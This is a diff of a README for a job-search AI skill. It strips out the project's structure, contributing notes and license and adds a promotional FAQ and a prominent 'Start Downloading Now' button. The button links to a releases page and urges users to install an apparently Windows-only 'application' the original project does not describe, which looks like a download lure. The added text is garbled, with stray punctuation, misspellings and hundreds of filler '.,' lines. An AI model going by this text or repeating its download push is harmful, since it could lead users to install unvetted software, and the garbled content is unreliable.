-├── .codex-plugin/plugin.json            # ChatGPT/Codex universal Plugin manifest
-├── skills/job-navigation-skill/
-│   ├── SKILL.md                         # Core decision router
-│   ├── agents/openai.yaml               # Codex UI metadata
-│   ├── references/                      # Conditional specialist guidance
-│   ├── evals/cases.yaml                 # Nine output-behavior scenarios
-│   ├── evals/trigger-cases.yaml         # 14 bilingual discovery scenarios
-│   └── scripts/summarize_evals.py       # Local paired-result summary
-├── examples/                            # Explicitly labeled examples
-├── scripts/install.py                   # Transactional installer
-├── scripts/package_skill.py             # ChatGPT, Claude, and Cursor archive builder
-├── scripts/validate_repo.py             # Structure and privacy checks
-├── ARCHITECTURE.md
-├── ROADMAP.md
-├── CHANGELOG.md
-└── .github/                             # CI, issue forms, and PR checklist
-```
+### Q: Do I need to know how to code?
+**A:** No programming knowledge is needed whatsoever.g. The skill handles all the technical work behind the scenes—you just chat with your AI assistant like you normally would.,
 
-## Contributing and license
+.,
 
-Observed failures, clearer language, behavioral tests, translations, and privacy-safe aggregate evaluations are welcome. Start with [CONTRIBUTING.md](CONTRIBUTING.md) and follow the [code of conduct](CODE_OF_CONDUCT.md).
+.
 
-[MIT](LICENSE). Use it, inspect it, adapt it, and report where it fails.
+
+
+### Q: Will this work on a Mac or Linux computer?
+**A:** While designed for Windows, the skill's instructions and methods work with any device that can access the supported AI assistants.. For the desktop app version,, check the download page for other operating system options if available.,
+
+.,
+
+.,
+
+### Q: How is this different from just asking ChatGPT for career advice?
+**A:** Great question!.| | While ChatGPT gives general advice based on its training data, job-navigation-skill actively researches **current** job postings and structured data. This means the advice you get is based on what's happening in the job market **right now**,, not just historical patterns.,
+
+.,
+
+.,
+
+### Q: Is my resume data safe?
+**A:** Your resume is processed throughe the AI assistant you're already using.. Always review the privacy policy ofthe AI platform you choose.for the highest level of privacy, consider using local versions of these tools.,
+
+.,
+
+.,
+
+## 🚀 Ready to Take Control of Your Job Search?
+
+Don't let another week pass by sending out blind applications and hoping for the best. With job-navigation-skill,, you'll have a clear,, evidence-based roadmap to your next job.,
+
+.,
+
+.
+
+**Here's your action plan:**
+
+1. **⬇️ Click the download button** below.
+2. **💻 Install the application** following the simple steps above.
+3. **🤖 Open your AI assistant** and enable the skill.
+4. **📄 Upload your resume** and start getting intelligent job matches.,
+
+.,
+
+.
+
+<div align="center">
+  <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="display:inline-block; background:linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color:white; padding:16px 32px; font-size:20px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(79,172,254,0.4); margin:20px 0;">⬇️ Start Downloading Now - It's Free</a>
+</div>
+
+.,
+
+.,
+
+.
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.,
+
+.
+
+**Keywords:** career,, codex-skills,, cursor,, industry-solutions,, job-search,, jobs,, jobsearch,, resume,, skill-development,, student,, work-buddy
